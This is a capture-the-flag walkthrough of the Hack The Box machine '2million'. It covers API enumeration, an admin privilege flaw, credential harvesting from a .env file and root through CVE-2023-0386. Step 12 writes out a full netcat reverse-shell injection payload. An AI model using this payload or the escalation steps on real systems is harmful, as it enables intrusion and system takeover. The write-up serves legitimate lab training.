# INITIAL ACCESS

## DISCOVERY

1. Run a `nmap` scan and discover ports 22 and 80 open

![nmap scan](screenshots/01-nmap-scan.png)

2. Add `2million.htb` to the `/etc/hosts` file

3. Explore the webpage and discover the `/invite` endpoint

![invite page](screenshots/02-invite-page.png)

4. Using BurpSuite, notice that this page makes a call to `js/inviteapi.min.js`

![invite api javascript](screenshots/03-iniviteapi-js.png)

5. The js content is obfuscated, but you can copy it as a one-liner and paste it to https://beautifier.io/ to de-obfuscate it

![beautified code](screenshots/04-javascript-beautify.png)

6. Make a POST request to `/api/v1/invite/how/to/generate`

![api code generation](screenshots/05-generate-api.png)

7. Decode the message using [CyberChef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=VmEgYmVxcmUgZ2IgdHJhcmVuZ3IgZ3VyIHZhaXZnciBwYnFyLCB6bnhyIG4gQ0JGRyBlcmRocmZnIGdiIC9uY3YvaTEvdmFpdmdyL3RyYXJlbmdy) 

![decoded message](screenshots/06-rot13-decode.png)

8. Make a POST request to `api/v1/invite/generate` and notice that the code you received is base64 encoded. Decode that to get the code

![decoded base64](screenshots/08-invite-code-decoded.png)

9. Make an account and log in. Then explore the landing page a bit.

![landing page](screenshots/09-landing-page.png)

10. After logging in, we can enumerate the API endpoints by submitting a request to `/api/v1`

![api endpoints](screenshots/10-api-endpoints.png)

11. Although most of the admin endpoints are locked against unauthenticated users, the `PUT` request to `/api/v1/admin/settings/update` is not. The following screenshots show the enumeration process of discovering how to abuse this to make our user admin, eventually submitting the following request

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Content-Type: application/json

{
	"email":"your registered email",
	"is_admin":1
}
```

![updating admin settings](screenshots/11-admin-settings-1.png)

![updating admin settings](screenshots/12-admin-settings-2.png)

![updating admin settings](screenshots/13-admin-settings-3.png)

![updating admin settings](screenshots/14-admin-settings-4.png)

Then we can verify that our user is now admin

![checking that user is now admin](screenshots/15-user-is-admin.png)

12. With admin permissions added to our account, we can verify the `/api/v1/admin/vpn/generate`. It expects a valid username, and the screenshots below show the enumeration process.

![generating vpn](screenshots/16-vpn-generate.png)

![generating vpn](screenshots/17-vpn-generate-2.png)

We can generate the ovpn file, but that's useless. There is no difference between generating the file as an admin or as a low-privileged user. However, we needed to provide the username when generating the file as admin. This is interesting because then it might be vulnerable to code injection - which is confirmed, as demonstrated below.

![command injection](screenshots/18-vpn-generate-cmd-injection.png)

![command injection confirmation](screenshots/19-command-injection-confirm.png)

We get our first shell by injecting `; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 1337 >/tmp/f` 

![first shell](screenshots/20-first-shell.png)

13. Investigate the files in `/var/www/html` and notice the `.env` contains the **admin** password.

![admin password found](screenshots/21-admin-password.png)

14. Use that password to SSH as **admin**

![admin shell](screenshots/22-admin-shell.png)

15. Enumerate admin files and notice that there is a message in `/var/mail/admin`

![locating admin files](screenshots/23-admin-files.png)

16. Search for the exploit mentioned. A Google search leads us to https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/

![exploit found](screenshots/25-exploit-found.png)

17. We can try the exploit mentioned, however, that is not sufficient since we still don't have root access.

![sending first stage of exploit](screenshots/26-exploit-first-stage.png)

18. The exploit website mentions a [proof of concept](https://github.com/xkaneiki/CVE-2023-0386/). We can download that POC and follow the manual (use Google translator) to get root.

![found proof of concept](screenshots/27-poc-found.png)

![got root](screenshots/28-root.png)